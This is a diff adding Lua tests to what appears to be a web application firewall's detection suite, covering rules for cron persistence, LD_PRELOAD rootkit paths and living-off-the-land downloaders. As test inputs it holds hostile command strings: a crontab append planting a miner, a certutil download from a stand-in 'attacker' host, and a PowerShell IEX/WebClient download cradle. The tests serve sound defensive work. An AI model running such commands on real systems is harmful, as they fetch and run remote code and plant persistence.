@@ -466,6 +466,95 @@ do
   check(hit == false, "27: webshell_ping — non-empty UA, no hit")
 end
 
+-- ── Test 28: R2 persistence — crontab append in args (rule 323) ──────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_persistence", "logonly")
+
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    args = "cmd=(crontab%20-l;%20echo%20miner)",
+  }))
+  check(hit == true,                                            "28: persistence — hit")
+  check(reason and reason:find("PERSISTENCE:CRONTAB_APPEND", 1, true),
+                                                                "28: persistence — tag")
+  check(action == "logonly",                                    "28: persistence — logonly")
+  check(rule_id == 323,                                         "28: persistence — rule id 323")
+end
+
+-- ── Test 29: R2 persistence — bare crontab mention doesn't fire ──────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_persistence", "logonly")
+
+  -- "crontab -l" alone is too benign to flag (admin tools list cron).
+  local hit = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "Run 'crontab -l' to list cron entries.",
+  }))
+  check(hit == false, "29: persistence — bare crontab -l prose, no hit")
+end
+
+-- ── Test 30: R3 rootkit_artifacts — LD_PRELOAD path in body (rule 324) ───────
+do
+  disable_all_rules()
+  waf.set_rule("rule_rootkit_artifacts", "logonly")
+
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "evil=LD_PRELOAD=/tmp/x.so /usr/bin/id",
+  }))
+  check(hit == true,                                          "30: rootkit — hit")
+  check(reason and reason:find("ROOTKIT:LD_PRELOAD_PATH", 1, true),
+                                                              "30: rootkit — tag")
+  check(action == "logonly",                                  "30: rootkit — logonly")
+  check(rule_id == 324,                                       "30: rootkit — rule id 324")
+end
+
+-- ── Test 31: R3 rootkit_artifacts — bare LD_PRELOAD mention doesn't fire ─────
+do
+  disable_all_rules()
+  waf.set_rule("rule_rootkit_artifacts", "logonly")
+
+  -- "LD_PRELOAD" without the =/ assignment shape is benign prose.
+  local hit = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "The LD_PRELOAD environment variable lets you preload a shared library.",
+  }))
+  check(hit == false, "31: rootkit — bare LD_PRELOAD prose, no hit")
+end
+
+-- ── Test 32: R4 lolbin — certutil downloader (rule 325) ──────────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_lolbin", "logonly")
+
+  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "cmd=certutil -urlcache -split -f http://attacker/x.exe",
+  }))
+  check(hit == true,                                          "32: lolbin — hit")
+  check(reason and reason:find("LOLBIN:CERTUTIL_URLCACHE", 1, true),
+                                                              "32: lolbin — tag")
+  check(action == "logonly",                                  "32: lolbin — logonly")
+  check(rule_id == 325,                                       "32: lolbin — rule id 325")
+end
+
+-- ── Test 33: R4 lolbin — IEX-WebClient is R1's territory, not R4's ───────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_lolbin",        "logonly")
+  waf.set_rule("rule_reverse_shell", "logonly")
+
+  -- Pattern that's intentionally only in R1's table (not R4's). Asserts R4
+  -- doesn't double-count it; the hit should come from rule 322, not 325.
+  local hit, _reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
+    method = "POST",
+    body   = "cmd=iex(new-object net.webclient).downloadstring('http://x')",
+  }))
+  check(hit == true,    "33: lolbin/r1 — IEX-WebClient hit")
+  check(rule_id == 322, "33: lolbin/r1 — credited to R1 (322), not R4 (325)")
+end
+
 if fails > 0 then
   io.stderr:write(string.format("\n%d severity test(s) failed\n", fails))
   os.exit(1)
